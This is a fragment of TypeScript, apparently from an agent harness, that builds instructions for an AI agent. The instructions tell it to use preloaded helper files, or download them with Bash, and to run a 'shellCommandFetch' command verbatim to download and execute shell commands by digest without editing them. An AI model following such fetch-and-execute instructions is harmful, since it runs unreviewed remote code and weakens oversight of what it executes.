...
export function buildV2Instructions(rawPin: unknown): string {
  ...
  return [
    ...
    "ADAPTER ASSET PATH: This path is mandatory whenever a localAction contains approvalTool. The harness adapter has already preloaded and digest-verified ./manifest.json and ./clockchain-agent-handshake.cjs in the disposable working directory. Do not download or overwrite either file. Inspect the preloaded manifest and helper source, then use only the returned approvalTool for local actions.",
    `PORTABLE FALLBACK: Use this path only when approvalTool is not available and both pinned files are absent. Download each file as its own separate Bash tool call; never prefix, wrap, combine, or add shell separators. Manifest command: ${manifestDownload} After that completes, helper command: ${helperDownload}. Inspect both downloaded files before execution. Do not modify either file and do not use WebFetch for this local download step.`,
    ...
    "TRANSCRIPTION-SAFE FETCH: every helperStep also carries shellCommandFetch — a short command that downloads the exact shellCommand bytes by their commandSha256 and verifies the digest before executing. Prefer it over hand-transcribing a multi-KB shellCommand: run shellCommandFetch verbatim exactly once per step; it fails closed if the fetched bytes do not match commandSha256. The same rules apply — never edit, reconstruct, or re-encode it.",
